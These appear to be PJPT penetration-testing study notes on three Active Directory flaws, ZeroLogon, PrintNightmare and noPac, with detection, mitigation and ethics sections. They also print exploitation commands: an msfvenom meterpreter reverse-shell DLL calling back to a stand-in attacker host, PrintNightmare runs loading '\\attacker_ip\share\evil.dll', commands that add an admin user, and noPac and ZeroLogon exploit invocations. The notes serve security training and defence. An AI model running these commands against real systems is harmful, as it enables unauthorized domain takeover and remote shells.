# Recent (and Relevant) Active Directory Vulnerabilities

## 🎯 Overview

**Active Directory vulnerabilities occur all the time.** These recent major vulnerabilities represent **critical security flaws** that can lead to **complete domain compromise** and should be part of every PJPT assessment.

> **"It's worth checking for these vulnerabilities, but you should not attempt to exploit them unless your client approves"** ⚠️

## 🚨 Major Recent Vulnerabilities

### 1. **ZeroLogon (CVE-2020-1472)**
**Netlogon Remote Protocol vulnerability allowing complete domain takeover**

#### What It Is
- **Critical vulnerability** in Windows Netlogon Remote Protocol (MS-NRPC)
- **Authentication bypass** allowing attackers to impersonate domain controllers
- **Complete domain compromise** possible within minutes
- **CVSS Score: 10.0** (Maximum severity)

#### Technical Details
```bash
# Vulnerability allows setting machine account password to empty string
# This bypasses authentication and grants administrative access

# Detection Methods
nmap -p 445 --script smb2-security-mode target_range
crackmapexec smb target_range --gen-relay-list zerologon_targets.txt

# Exploitation Tools (Client Approval Required!)
# CVE-2020-1472 PoC scripts available on GitHub
# Impacket zerologon_tester.py for testing
python3 zerologon_tester.py DC_NAME DC_IP
```

#### Impact Assessment
- **Instant domain admin access** without credentials
- **Complete Active Directory compromise**
- **All domain data accessible** including NTDS.dit
- **Persistent access** through Golden Tickets

### 2. **PrintNightmare (CVE-2021-1675 / CVE-2021-34527)**
**Windows Print Spooler privilege escalation and RCE vulnerability**

#### What It Is
- **Critical vulnerability** in Windows Print Spooler service
- **Local privilege escalation** and **remote code execution**
- **Affects all Windows versions** including domain controllers
- **Easy to exploit** with public tools available

#### Technical Details
```bash
# Two main variants:
# CVE-2021-1675: Local privilege escalation via Point and Print
# CVE-2021-34527: Remote code execution via Print Spooler RPC

# Detection Methods (Based on TCM Security Walkthrough)
rpcdump.py @target_ip | egrep 'MS-RPRN|MS-PAR'
# MS-RPRN = Print System Remote Protocol
# MS-PAR = Print System Asynchronous Remote Protocol

crackmapexec smb target_range -M printnightmare

# Check if Print Spooler is running
sc query spooler
Get-Service -Name Spooler

# Manual detection via registry
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /v RestrictDriverInstallationToAdministrators

# Alternative RPC detection methods
rpcinfo -p target_ip | grep -i spooler
nmap -p 135 --script=msrpc-enum target_ip
```

#### Practical Exploitation (Client Approval Required!)
```bash
# GitHub Implementation: cube0x0/CVE-2021-1675
# C# and Impacket implementation of PrintNightmare

# Method 1: Python Implementation (CVE-2021-1675.py)
python3 CVE-2021-1675.py target_ip/username:password@target_ip

# Method 2: C# Implementation (SharpPrintNightmare)
SharpPrintNightmare.exe C:\Windows\System32\kernelbase.dll \\target_ip

# Method 3: PowerShell Implementation
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -DriverName "1337" -NewUser -Username "admin" -Password "P@ssw0rd123!"

# Method 4: Impacket Implementation
python3 CVE-2021-1675.py 'domain/user:password@target_ip' -dll '\\attacker_ip\share\evil.dll'
```

#### Impact Assessment
- **SYSTEM level access** on affected systems
- **Domain controller compromise** if DC affected
- **Lateral movement** across entire domain
- **Service disruption** potential

#### PrintNightmare Walkthrough (Based on cube0x0 Implementation)
```bash
# Step 1: Identify vulnerable systems
crackmapexec smb target_range -M printnightmare
# Look for: [+] PrintNightmare vulnerable

# Step 2: Verify Print Spooler service
crackmapexec smb target_ip -u user -p pass -x "sc query spooler"
# Should show: STATE: 4 RUNNING

# Step 3: Setup SMB share for DLL hosting
impacket-smbserver share . -smb2support -username user -password pass

# Step 4: Create malicious DLL (if exploitation approved)
# Use msfvenom or custom DLL for payload delivery
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o evil.dll

# Step 5: Execute PrintNightmare exploit
python3 CVE-2021-1675.py 'domain/user:password@target_ip' -dll '\\attacker_ip\share\evil.dll'

# Alternative: Add new admin user
python3 CVE-2021-1675.py target_ip/user:pass@target_ip -newuser -username "backup" -password "P@ssw0rd123!"
```

#### Detection Indicators
```bash
# Event Log Monitoring
# Event ID 4624: Account logon (new admin account)
# Event ID 4720: User account created
# Event ID 7045: Service installation (malicious driver)

# File System Artifacts
dir C:\Windows\System32\spool\drivers\x64\3\
# Look for unusual DLL files

# Registry Artifacts
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers"
# Check for suspicious driver entries
```

### 3. **Sam the Admin (CVE-2021-42278 / CVE-2021-42287)**
**Active Directory domain privilege escalation vulnerability**

#### What It Is
- **Privilege escalation** vulnerability in Active Directory
- **Computer account impersonation** of domain controllers
- **Kerberos authentication bypass** leading to domain admin
- **Combination of two CVEs** working together

#### Technical Details
```bash
# Vulnerability chain:
# 1. CVE-2021-42278: Computer account name confusion
# 2. CVE-2021-42287: Kerberos authentication bypass

# Detection Methods
ldapsearch -x -H ldap://dc_ip -D "user@domain" -W -b "DC=domain,DC=local" "(objectClass=computer)"

# Check for vulnerable configurations
crackmapexec ldap target_ip -u user -p pass --kdcHost dc_ip

# Exploitation Tools (Client Approval Required!)
# noPac.py from Impacket
python3 noPac.py domain/user:password -dc-ip DC_IP -use-ldap
```

#### Impact Assessment
- **Domain administrator privileges** without existing admin access
- **Complete domain compromise** through privilege escalation
- **Stealth operation** - difficult to detect
- **Persistence** through standard domain admin techniques

## 🔍 PJPT Assessment Strategy

### Detection and Documentation Approach
```bash
# Phase 1: Vulnerability Scanning (No Exploitation)
nmap -sV --script vuln target_range
crackmapexec smb target_range --gen-relay-list vulnerable_hosts.txt

# Phase 2: Service Enumeration
crackmapexec smb target_range -M zerologon
crackmapexec smb target_range -M printnightmare
crackmapexec ldap target_range -u user -p pass --kdcHost dc_ip

# Phase 3: Documentation
# Screenshot vulnerability scan results
# Document affected systems and versions
# Assess potential impact without exploitation
```

### Professional Approach
1. **Identify vulnerable systems** through scanning
2. **Document findings** with evidence screenshots
3. **Assess potential impact** based on system criticality
4. **Recommend immediate patching** in report
5. **Request client approval** before any exploitation attempts

## ⚠️ Ethical Considerations

### Why Client Approval is Critical
- **High-impact vulnerabilities** can cause system instability
- **Service disruption** potential during exploitation
- **Legal implications** of unauthorized exploitation
- **Professional standards** require explicit permission

### Safe Assessment Practices
```bash
# DO: Scan and identify vulnerable systems
nmap --script smb-vuln-* target_range

# DO: Document vulnerability presence
crackmapexec smb target_range --gen-relay-list findings.txt

# DON'T: Exploit without explicit approval
# DON'T: Risk system stability during assessment
# DON'T: Assume "penetration test" includes destructive testing
```

## 📊 Business Impact Documentation

### Risk Assessment Framework
For each vulnerability found:

#### ZeroLogon Impact
- **Criticality**: CRITICAL (CVSS 10.0)
- **Exploitability**: HIGH (Public exploits available)
- **Business Impact**: Complete domain compromise within minutes
- **Remediation**: Immediate patching required

#### PrintNightmare Impact  
- **Criticality**: HIGH (CVSS 8.8)
- **Exploitability**: HIGH (Easy to exploit)
- **Business Impact**: System compromise and lateral movement
- **Remediation**: Disable Print Spooler or apply patches

#### Sam the Admin Impact
- **Criticality**: HIGH (CVSS 8.8)
- **Exploitability**: MEDIUM (Requires domain credentials)
- **Business Impact**: Privilege escalation to domain admin
- **Remediation**: Apply security updates and monitor

## 🛡️ Defensive Recommendations

### Immediate Actions
```bash
# ZeroLogon Mitigation
# Apply KB4565351 and enforce secure RPC
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" /v FullSecureChannelProtection /t REG_DWORD /d 1

# PrintNightmare Mitigation (Based on TCM Security Walkthrough)
# Method 1: Stop and Disable Spooler Service
Stop-Service Spooler
sc stop spooler
sc config spooler start=disabled

# Method 2: Registry-based Permanent Disable
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f
# Start = 4 means "Disabled"

# Method 3: Group Policy Disable (Domain-wide)
# Computer Configuration > Administrative Templates > Printers
# "Allow Print Spooler to accept client connections" = Disabled

# Verification Commands
sc query spooler
Get-Service -Name Spooler | Select-Object Status,StartType

# Sam the Admin Mitigation
# Apply November 2021 security updates
# Monitor for suspicious computer account creation
```

### Long-term Security Improvements
- **Regular patch management** program
- **Vulnerability scanning** automation
- **Privileged account monitoring**
- **Network segmentation** to limit impact
- **Incident response** planning for critical vulnerabilities

## 🎯 PJPT Exam Integration

### Time Allocation (15 minutes)
1. **5 minutes**: Automated vulnerability scanning
2. **5 minutes**: Manual verification of critical findings
3. **5 minutes**: Documentation and impact assessment

### Documentation Requirements
1. **Vulnerability scan results** - Screenshot of identified vulnerabilities
2. **Affected system inventory** - List of vulnerable hosts
3. **Impact assessment** - Business risk evaluation
4. **Remediation recommendations** - Specific patching guidance
5. **Client communication** - Request for exploitation approval if needed

### PrintNightmare PJPT Strategy
```bash
# Quick Detection (5 minutes) - TCM Security Method
rpcdump.py @target_ip | egrep 'MS-RPRN|MS-PAR'
crackmapexec smb target_range -M printnightmare
nmap -p 445 --script smb-vuln-cve-2021-1675 target_range

# Service Verification (2 minutes)
crackmapexec smb vulnerable_hosts -u user -p pass -x "sc query spooler"
# Look for: STATE: 4 RUNNING (vulnerable)
# Look for: STATE: 1 STOPPED (not vulnerable)

# Impact Documentation (3 minutes)
# Screenshot vulnerable systems
# Document Print Spooler service status
# Assess criticality (Domain Controllers = CRITICAL)
# Note potential for lateral movement

# Exploitation Decision (5 minutes)
# Request client approval for exploitation
# If approved: Setup SMB share and execute exploit
# If not approved: Document vulnerability and recommend patching
```

### Integration with Attack Chain
- **Discovery Phase**: Identify vulnerable systems during enumeration
- **Privilege Escalation**: Use approved vulnerabilities for escalation
- **Lateral Movement**: Leverage vulnerabilities for domain spread
- **Persistence**: Combine with Golden Tickets for long-term access

## 🔗 Tool Integration

### Vulnerability Detection
```bash
# Comprehensive vulnerability scanning
nmap -sV --script vuln,smb-vuln-* target_range

# CrackMapExec modules
crackmapexec smb target_range -M zerologon
crackmapexec smb target_range -M printnightmare

# Specialized tools
python3 zerologon_tester.py DC_NAME DC_IP
```

### GitHub Resources for Exploitation Tools
```bash
# PrintNightmare - cube0x0/CVE-2021-1675 (Featured in Screenshot)
git clone https://github.com/cube0x0/CVE-2021-1675.git
# Contains: CVE-2021-1675.py, SharpPrintNightmare, PowerShell modules
# Description: "C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527"

# ZeroLogon - SecuraBV/CVE-2020-1472
git clone https://github.com/SecuraBV/CVE-2020-1472.git
# Contains: zerologon_tester.py, exploitation scripts

# Sam the Admin - Ridter/noPac
git clone https://github.com/Ridter/noPac.git
# Contains: noPac.py, scanner.py

# Alternative PrintNightmare implementations
git clone https://github.com/calebstewart/CVE-2021-1675.git
git clone https://github.com/ly4k/PrintNightmare.git
```

### Exploitation (With Approval)
```bash
# ZeroLogon exploitation
python3 cve-2020-1472-exploit.py DC_NAME DC_IP

# PrintNightmare exploitation (cube0x0 implementation from screenshot)
python3 CVE-2021-1675.py target_ip/user:password@target_ip
python3 CVE-2021-1675.py 'domain/user:password@target_ip' -dll '\\attacker_ip\share\evil.dll'

# Alternative PrintNightmare methods
SharpPrintNightmare.exe C:\Windows\System32\kernelbase.dll \\target_ip
Invoke-Nightmare -DriverName "1337" -NewUser -Username "admin" -Password "P@ssw0rd123!"

# Sam the Admin exploitation
python3 noPac.py domain/user:password -dc-ip DC_IP -use-ldap
```

## 📈 Staying Current

### Vulnerability Intelligence Sources
- **Microsoft Security Response Center** (MSRC)
- **NIST National Vulnerability Database** (NVD)
- **SANS Internet Storm Center**
- **Security researcher Twitter accounts**
- **GitHub security advisories**

### Regular Assessment Updates
- **Monthly vulnerability reviews**
- **Quarterly assessment methodology updates**
- **Annual security control validation**
- **Continuous threat intelligence monitoring**

---

## 📝 Final Notes

**Recent AD vulnerabilities represent some of the most critical security risks in modern environments.** They provide:
- **Rapid domain compromise** capabilities
- **High business impact** potential
- **Easy exploitation** with public tools
- **Significant remediation urgency**

**PJPT Success Strategy**: Focus on **identifying and documenting** these vulnerabilities rather than exploiting them. The business value comes from showing the client their **critical exposure** and providing **actionable remediation guidance**.

**Remember**: Professional penetration testing is about **demonstrating risk** while **maintaining system stability** and **respecting client boundaries**. Always get explicit approval before exploiting high-impact vulnerabilities! ⚠️

**Key Takeaway**: These vulnerabilities can provide **instant domain admin access**, but the real value lies in **helping clients understand their risk** and **implement proper security controls** to prevent exploitation by malicious actors. 